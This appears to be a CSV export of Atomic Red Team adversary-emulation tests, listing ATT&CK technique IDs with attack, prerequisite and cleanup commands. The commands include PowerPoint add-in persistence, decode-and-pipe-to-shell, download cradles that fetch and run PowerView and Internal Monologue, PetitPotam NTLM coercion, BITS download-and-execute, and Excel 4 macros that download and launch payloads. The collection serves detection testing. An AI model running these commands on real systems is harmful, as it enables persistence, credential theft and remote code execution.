"TechniqueID","TestName","Command","PrereqCommand","CleanupCommand","SourceFile"
"T1137.006","Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)","Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam"" ""$env:APPDATA\Microsoft\Addins\notepad.ppam""
$ver = (New-Object -COMObject ""PowerPoint.Application"").version
$ExcelRegPath=""HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad""
New-Item -type Directory $ExcelRegPath -Force | Out-Null
New-ItemProperty $ExcelRegPath ""Autoload"" -value ""1"" -propertyType DWORD  | Out-Null
New-ItemProperty $ExcelRegPath ""Path"" -value ""notepad.ppam"" -propertyType string | Out-Null
Stop-Process -Name ""PowerPnt"" -ErrorAction Ignore
Start-Process ""PowerPnt""
","Write-Host ""You will need to install Microsoft PowerPoint manually to meet this requirement""

---
New-Item -Type Directory ""PathToAtomicsFolder\T1137.006\bin\Addins\"" -Force | Out-Null
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/PptVBAaddin.ppam"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam""","$ver = (New-Object -COMObject ""PowerPoint.Application"").version
Remove-Item ""HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad"" -ErrorAction Ignore
Stop-Process -Name ""notepad"",""PowerPnt"" -ErrorAction Ignore
Start-Sleep 3
Remove-Item ""$env:APPDATA\Microsoft\AddIns\notepad.ppam""  -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1137.006\T1137.006.yaml"
"T1140","Deobfuscate/Decode Files Or Information","certutil -encode #{executable} %temp%\T1140_calc.txt
certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe
","","del %temp%\T1140_calc.txt >nul 2>&1
del %temp%\T1140_calc_decoded.exe >nul 2>&1
","C:\AtomicRedTeam\atomics\T1140\T1140.yaml"
"T1140","Certutil Rename and Decode","copy %windir%\system32\certutil.exe %temp%\tcm.tmp
%temp%\tcm.tmp -encode #{executable} %temp%\T1140_calc2.txt
%temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe
","","del %temp%\tcm.tmp >nul 2>&1
del %temp%\T1140_calc2.txt >nul 2>&1
del %temp%\T1140_calc2_decoded.exe >nul 2>&1
","C:\AtomicRedTeam\atomics\T1140\T1140.yaml"
"T1140","Base64 decoding with Python","ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(""#{message}"".encode());print(enc.decode())')
python3 -c ""import base64;dec=base64.b64decode(\""$ENCODED\"");print(dec.decode())""
python3 -c ""import base64 as d;dec=d.b64decode(\""$ENCODED\"");print(dec.decode())""
python3 -c ""from base64 import b64decode;dec=b64decode(\""$ENCODED\"");print(dec.decode())""
python3 -c ""from base64 import b64decode as d;dec=d(\""$ENCODED\"");print(dec.decode())""
echo $ENCODED | python3 -c ""import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())""
echo $ENCODED > #{encoded_file} && python3 -c ""import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())""
","echo ""Please install Python 3""
","","C:\AtomicRedTeam\atomics\T1140\T1140.yaml"
"T1140","Base64 decoding with Perl","ENCODED=$(perl -e ""use MIME::Base64;print(encode_base64('#{message}'));"")
perl -le ""use MIME::Base64;print(decode_base64('$ENCODED'));""
echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'
echo $ENCODED > #{encoded_file} && perl -le 'use MIME::Base64;open($f,""<"",""#{encoded_file}"");print(decode_base64(<$f>));'
","echo ""Please install Perl""
","","C:\AtomicRedTeam\atomics\T1140\T1140.yaml"
"T1140","Base64 decoding with shell utilities","ENCODED=$(echo '#{message}' | base64)
printf $ENCODED | base64 -d
echo $ENCODED | base64 -d
echo $(echo $ENCODED) | base64 -d
echo $ENCODED > #{encoded_file} && base64 -d #{encoded_file}
echo $ENCODED > #{encoded_file} && base64 -d < #{encoded_file}
echo $ENCODED > #{encoded_file} && cat #{encoded_file} | base64 -d
echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | base64 -d
bash -c ""{echo,\""$(echo $ENCODED)\""}|{base64,-d}""
","","","C:\AtomicRedTeam\atomics\T1140\T1140.yaml"
"T1140","Base64 decoding with shell utilities (freebsd)","ENCODED=$(echo '#{message}' | b64encode -r -)
printf $ENCODED | b64decode -r
echo $ENCODED | b64decode -r
echo $(echo $ENCODED) | b64decode -r
echo $ENCODED > #{encoded_file} && b64encode -r #{encoded_file}
echo $ENCODED > #{encoded_file} && b64decode -r < #{encoded_file}
echo $ENCODED > #{encoded_file} && cat #{encoded_file} | b64decode -r
echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | b64decode -r
","","","C:\AtomicRedTeam\atomics\T1140\T1140.yaml"
"T1140","FreeBSD b64encode Shebang in CLI","echo #{bash_encoded} | b64decode -r | sh
echo #{dash_encoded} | b64decode -r | sh
echo #{fish_encoded} | b64decode -r | sh
echo #{sh_encoded} | b64decode -r | sh
","echo ""please install b64decode""
","","C:\AtomicRedTeam\atomics\T1140\T1140.yaml"
"T1140","Hex decoding with shell utilities","ENCODED=$(echo '#{message}' | xxd -ps -c 256)
printf $ENCODED | xxd -r -p
echo $ENCODED | xxd -r -p
echo $(echo $ENCODED) | xxd -r -p
echo $ENCODED > #{encoded_file} && xxd -r -p #{encoded_file}
echo $ENCODED > #{encoded_file} && xxd -r -p < #{encoded_file}
echo $ENCODED > #{encoded_file} && cat #{encoded_file} | xxd -r -p
echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | xxd -r -p
","echo ""Please install xxd""
","","C:\AtomicRedTeam\atomics\T1140\T1140.yaml"
"T1140","Linux Base64 Encoded Shebang in CLI","echo #{bash_encoded} | base64 -d | bash
echo #{dash_encoded} | base64 -d | bash
echo #{fish_encoded} | base64 -d | bash
echo #{sh_encoded} | base64 -d | bash
","echo ""please install base64""
","","C:\AtomicRedTeam\atomics\T1140\T1140.yaml"
"T1140","XOR decoding and command execution using Python","python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: """".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = ""#{encrypted_command}""; key = ""#{xor_key}""; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'","echo ""Install Python3""","","C:\AtomicRedTeam\atomics\T1140\T1140.yaml"
"T1140","Expand CAB with expand.exe","mkdir ""#{output_dir}"" >nul 2>&1
echo hello from atomic red team > ""PathToAtomicsFolder\T1140\src\art-expand-source.txt""
makecab ""PathToAtomicsFolder\T1140\src\art-expand-source.txt"" ""#{cab_path}""
pushd ""#{output_dir}""
expand ""#{cab_path}"" -F:* .
popd
","","del ""PathToAtomicsFolder\T1140\src\art-expand-source.txt"" >nul 2>&1
del ""#{cab_path}"" >nul 2>&1
rmdir ""#{output_dir}"" /s /q >nul 2>&1
","C:\AtomicRedTeam\atomics\T1140\T1140.yaml"
"T1176","Chrome/Chromium (Developer Mode)","","","","C:\AtomicRedTeam\atomics\T1176\T1176.yaml"
"T1176","Firefox","","","","C:\AtomicRedTeam\atomics\T1176\T1176.yaml"
"T1176","Edge Chromium Addon - VPN","","","","C:\AtomicRedTeam\atomics\T1176\T1176.yaml"
"T1176","Google Chrome Load Unpacked Extension With Command Line","
# Chromium
$chromium =  ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/1153778/chrome-win.zip""

# uBlock Origin Lite to test side-loading
$extension = ""https://github.com/uBlockOrigin/uBOL-home/releases/download/uBOLite_2024.11.25.1376/uBOLite_2024.11.25.1376.chromium.mv3.zip""

Set-Location ""#{working_dir}""

Set-Variable ProgressPreference SilentlyContinue
Invoke-WebRequest -URI $chromium -OutFile ""#{working_dir}\chrome.zip""
Invoke-WebRequest -URI $extension -OutFile ""#{working_dir}\extension.zip""


Expand-Archive chrome.zip -DestinationPath ""#{working_dir}"" -Force
Expand-Archive extension.zip -Force

Start-Process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -PassThru","","Set-Location ""#{working_dir}""
Stop-Process -Name chrome -Force
Remove-Item .\chrome.zip, .\chrome-win, .\extension, .\extension.zip -Recurse -Force
Set-Variable ProgressPreference Continue","C:\AtomicRedTeam\atomics\T1176\T1176.yaml"
"T1187","PetitPotam","& ""#{petitpotam_path}"" #{captureServerIP} #{targetServerIP} #{efsApi}
Write-Host ""End of PetitPotam attack""
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/topotam/PetitPotam/blob/2ae559f938e67d0cd59c5afcaac67672b9ef2981/PetitPotam.exe?raw=true"" -OutFile ""#{petitpotam_path}""
","","C:\AtomicRedTeam\atomics\T1187\T1187.yaml"
"T1187","WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS","iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
Invoke-Internalmonologue -command ""-Downgrade true -impersonate true -restore true""","","","C:\AtomicRedTeam\atomics\T1187\T1187.yaml"
"T1187","Trigger an authenticated RPC call to a target server with no Sign flag set","rpcping -s #{server_ip} -e #{custom_port} /a connect /u NTLM 1>$Null","","","C:\AtomicRedTeam\atomics\T1187\T1187.yaml"
"T1195","Octopus Scanner Malware Open Source Supply Chain","copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db
schtasks /create /tn ExplorerSync /tr ""javaw -jar %temp%\..\Microsoft\ExplorerSync.db"" /sc MINUTE /f
","Out-File -FilePath ""#{rat_payload}""
","schtasks /delete /tn ExplorerSync /F 2>null
del %temp%\..\Microsoft\ExplorerSync.db 2>null
del %temp%\ExplorerSync.db 2>null
","C:\AtomicRedTeam\atomics\T1195\T1195.yaml"
"T1195.002","Simulate npm package installation on a Linux system","kubectl run #{pod_name} --image=#{image_name} --restart=Never --attach --rm -i -- bash -lc ""mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install #{package_name} --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json""
","echo ""kubectl must be installed""","","C:\AtomicRedTeam\atomics\T1195.002\T1195.002.yaml"
"T1197","Bitsadmin Download (cmd)","bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}
","","del #{local_file} >nul 2>&1
","C:\AtomicRedTeam\atomics\T1197\T1197.yaml"
"T1197","Bitsadmin Download (PowerShell)","Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}
","","Remove-Item #{local_file} -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1197\T1197.yaml"
"T1197","Persist, Download, & Execute","bitsadmin.exe /create #{bits_job_name}
bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL
bitsadmin.exe /resume #{bits_job_name}
ping -n 5 127.0.0.1 >nul 2>&1
bitsadmin.exe /complete #{bits_job_name}
","","del #{local_file} >nul 2>&1
","C:\AtomicRedTeam\atomics\T1197\T1197.yaml"
"T1197","Bits download using desktopimgdownldr.exe (cmd)","set ""#{download_path}"" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
","","del #{cleanup_path}\#{cleanup_file} >nul 2>&1
","C:\AtomicRedTeam\atomics\T1197\T1197.yaml"
"T1201","Examine password complexity policy - Ubuntu","cat /etc/pam.d/common-password
","","","C:\AtomicRedTeam\atomics\T1201\T1201.yaml"
"T1201","Examine password complexity policy - FreeBSD","cat /etc/pam.d/passwd
","","","C:\AtomicRedTeam\atomics\T1201\T1201.yaml"
"T1201","Examine password complexity policy - CentOS/RHEL 7.x","cat /etc/security/pwquality.conf
","echo Please run from CentOS or RHEL v7
","","C:\AtomicRedTeam\atomics\T1201\T1201.yaml"
"T1201","Examine password complexity policy - CentOS/RHEL 6.x","cat /etc/pam.d/system-auth
cat /etc/security/pwquality.conf
","echo Please run from CentOS or RHEL v6
","","C:\AtomicRedTeam\atomics\T1201\T1201.yaml"
"T1201","Examine password expiration policy - All Linux","cat /etc/login.defs
","","","C:\AtomicRedTeam\atomics\T1201\T1201.yaml"
"T1201","Examine local password policy - Windows","net accounts
","","","C:\AtomicRedTeam\atomics\T1201\T1201.yaml"
"T1201","Examine domain password policy - Windows","net accounts /domain
","","","C:\AtomicRedTeam\atomics\T1201\T1201.yaml"
"T1201","Examine password policy - macOS","pwpolicy getaccountpolicies","","","C:\AtomicRedTeam\atomics\T1201\T1201.yaml"
"T1201","Get-DomainPolicy with PowerView","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose
","","","C:\AtomicRedTeam\atomics\T1201\T1201.yaml"
"T1201","Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy","get-addefaultdomainpasswordpolicy
","","","C:\AtomicRedTeam\atomics\T1201\T1201.yaml"
"T1201","Use of SecEdit.exe to export the local security policy (including the password policy)","secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt
","","","C:\AtomicRedTeam\atomics\T1201\T1201.yaml"
"T1201","Examine AWS Password Policy","aws iam get-account-password-policy
","echo Please install the aws-cli and configure your AWS defult profile using: aws configure
","","C:\AtomicRedTeam\atomics\T1201\T1201.yaml"
"T1202","Indirect Command Execution - pcalua.exe","pcalua.exe -a #{process}
pcalua.exe -a #{payload_path}
","","","C:\AtomicRedTeam\atomics\T1202\T1202.yaml"
"T1202","Indirect Command Execution - forfiles.exe","forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
","","","C:\AtomicRedTeam\atomics\T1202\T1202.yaml"
"T1202","Indirect Command Execution - conhost.exe","conhost.exe ""#{process}""
","","","C:\AtomicRedTeam\atomics\T1202\T1202.yaml"
"T1202","Indirect Command Execution - Scriptrunner.exe","Scriptrunner.exe -appvscript ""#{payload_path}""","","","C:\AtomicRedTeam\atomics\T1202\T1202.yaml"
"T1202","Indirect Command Execution - RunMRU Dialog","# Copy command to clipboard
Set-Clipboard -Value '#{command}'

# Open Run dialog
Start-Process -FilePath ""powershell"" -ArgumentList ""-c (New-Object -ComObject 'Shell.Application').FileRun()"" -WindowStyle Hidden

# Wait for Run dialog to open
Start-Sleep -Seconds 1

# Paste command and execute
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('^v')
Start-Sleep -Milliseconds 500
[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
","","","C:\AtomicRedTeam\atomics\T1202\T1202.yaml"
"T1204.002","OSTap Style Macro Execution","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""   Open `""#{jse_path}`"" For Output As #1`n   Write #1, `""WScript.Quit`""`n   Close #1`n   Shell`$ `""cscript.exe #{jse_path}`""`n""
Invoke-MalDoc -macroCode $macrocode -officeProduct ""#{ms_product}""
","Write-Host ""You will need to install Microsoft #{ms_product} manually to meet this requirement""
","Remove-Item #{jse_path} -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1204.002\T1204.002.yaml"
"T1204.002","OSTap Payload Download","echo var url = ""#{file_url}"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
cscript //E:Jscript #{script_file}
","","del #{script_file} /F /Q >nul 2>&1
","C:\AtomicRedTeam\atomics\T1204.002\T1204.002.yaml"
"T1204.002","Maldoc choice flags command execution","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""  a = Shell(`""cmd.exe /c choice /C Y /N /D Y /T 3`"", vbNormalFocus)""
Invoke-MalDoc -macroCode $macrocode -officeProduct ""#{ms_product}""
","Write-Host ""You will need to install Microsoft #{ms_product} manually to meet this requirement""
","","C:\AtomicRedTeam\atomics\T1204.002\T1204.002.yaml"
"T1204.002","OSTAP JS version","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""   Open `""#{jse_path}`"" For Output As #1`n   Write #1, `""WScript.Quit`""`n   Close #1`n   a = Shell(`""cmd.exe /c wscript.exe //E:jscript #{jse_path}`"", vbNormalFocus)`n""
Invoke-MalDoc -macroCode $macrocode -officeProduct ""#{ms_product}""
","Write-Host ""You will need to install Microsoft #{ms_product} manually to meet this requirement""
","","C:\AtomicRedTeam\atomics\T1204.002\T1204.002.yaml"
"T1204.002","Office launching .bat file from AppData","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""   Open `""#{bat_path}`"" For Output As #1`n   Write #1, `""calc.exe`""`n   Close #1`n   a = Shell(`""cmd.exe /c #{bat_path} `"", vbNormalFocus)`n""
Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
","Write-Host ""You will need to install Microsoft #{ms_product} manually to meet this requirement""
","Remove-Item #{bat_path} -ErrorAction Ignore
Get-Process | Where-Object { $_.MainModule.FileName -like ""*calculator*"" } | Stop-Process
","C:\AtomicRedTeam\atomics\T1204.002\T1204.002.yaml"
"T1204.002","Excel 4 Macro","$fname = ""$env:TEMP\atomic_redteam_x4m_exec.vbs""
$fname1 = ""$env:TEMP\procexp.exe""
if (Test-Path $fname) {
  Remove-Item $fname
  Remove-Item $fname1
}

$xlApp = New-Object -COMObject ""Excel.Application""
$xlApp.Visible = $True
$xlApp.DisplayAlerts = $False
$xlBook = $xlApp.Workbooks.Add()
$sheet = $xlBook.Excel4MacroSheets.Add()

if (""#{uname}"" -ne """") {
  $sheet.Cells.Item(1,1) = ""#{uname}""
} else {
  $sheet.Cells.Item(1,1) = ""=GET.WORKSPACE(26)""
}

$sheet.Cells.Item(2,1) = ""procexp.exe""
$sheet.Cells.Item(3,1) = ""atomic_redteam_x4m_exec.vbs""
$sheet.Cells.Item(4,1) = ""=IF(ISNUMBER(SEARCH(`""64`"",GET.WORKSPACE(1))), GOTO(A5),)""
$sheet.Cells.Item(5,1) = ""=FOPEN(`""C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A3&`""`"", 3)""
$sheet.Cells.Item(6,1) = ""=FWRITELN(A5, `""url = `""`""#{download_url}`""`""`"")""
$sheet.Cells.Item(7,1) = ""=FWRITELN(A5, `""`"")""
$sheet.Cells.Item(8,1) = ""=FWRITELN(A5, `""Set winHttp = CreateObject(`""`""WinHTTP.WinHTTPrequest.5.1`""`"")`"")""
$sheet.Cells.Item(9,1) = ""=FWRITELN(A5, `""winHttp.Open `""`""GET`""`"", url, False`"")""
$sheet.Cells.Item(10,1) = ""=FWRITELN(A5, `""winHttp.Send`"")""
$sheet.Cells.Item(11,1) = ""=FWRITELN(A5, `""If winHttp.Status = 200 Then`"")""
$sheet.Cells.Item(12,1) = ""=FWRITELN(A5, `""Set oStream = CreateObject(`""`""ADODB.Stream`""`"")`"")""
$sheet.Cells.Item(13,1) = ""=FWRITELN(A5, `""oStream.Open`"")""
$sheet.Cells.Item(14,1) = ""=FWRITELN(A5, `""oStream.Type = 1`"")""
$sheet.Cells.Item(15,1) = ""=FWRITELN(A5, `""oStream.Write winHttp.responseBody`"")""
$sheet.Cells.Item(16,1) = ""=FWRITELN(A5, `""oStream.SaveToFile `""`""C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A2&`""`""`"", 2`"")""
$sheet.Cells.Item(17,1) = ""=FWRITELN(A5, `""oStream.Close`"")""
$sheet.Cells.Item(18,1) = ""=FWRITELN(A5, `""End If`"")""
$sheet.Cells.Item(19,1) = ""=FCLOSE(A5)""
$sheet.Cells.Item(20,1) = ""=EXEC(`""explorer.exe C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A3&`""`"")""
$sheet.Cells.Item(21,1) = ""=WAIT(NOW()+`""00:00:05`"")""
$sheet.Cells.Item(22,1) = ""=EXEC(`""explorer.exe C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A2&`""`"")""
$sheet.Cells.Item(23,1) = ""=HALT()""
$sheet.Cells.Item(1,1).Name = ""runme""
$xlApp.Run(""runme"")
$xlApp.Quit()

[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()

Remove-Variable xlBook
Remove-Variable xlApp
","Write-Host ""You will need to install Microsoft Excel manually to meet this requirement""
","Stop-Process -Name ""procexp*"" -ErrorAction Ignore
Remove-Item ""$env:TEMP\atomic_redteam_x4m_exec.vbs"" -ErrorAction Ignore
Remove-Item ""$env:TEMP\procexp.exe"" -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1204.002\T1204.002.yaml"
